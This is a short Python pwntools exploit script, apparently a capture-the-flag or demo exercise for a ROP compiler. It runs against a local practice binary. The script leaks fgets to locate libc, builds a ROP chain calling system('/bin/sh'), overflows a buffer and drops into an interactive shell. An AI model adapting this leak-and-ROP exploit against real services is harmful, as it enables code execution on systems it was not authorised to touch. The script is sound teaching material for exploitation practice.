import sys, logging, binascii
import os
from pwn import *
from rop_compiler import ropme

filename = './leak_overflow'
libc = './libc-2.23.so'
os.environ['LD_LIBRARY_PATH'] = os.path.dirname(libc)
p = process([filename])
assert p.libc.path == os.path.abspath(libc)  # Ensure we use the libc that we've pulled gadgets from
#gdb.attach(p, "set disassembly-flavor intel\nbreak *main+133")

p.writeline("1")
p.readuntil("what address would you like to peek at?\n")
p.writeline("0x804a010") # leak address of fgets
fgets_addr = int(p.readline().split(":")[1].strip(), 16)
libc_address = fgets_addr - ELF(libc).symbols['fgets']

goals = [ ["function", "system", "/bin/sh"] ]
files = [(filename, None, None), (libc, 'libc.gadgets', libc_address)]
rop = ropme.rop(files, [libc], goals, log_level = logging.DEBUG)
payload = 'A'*272 + rop

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

p.writeline("2")
p.writeline(payload)
p.writeline("3")
p.interactive()

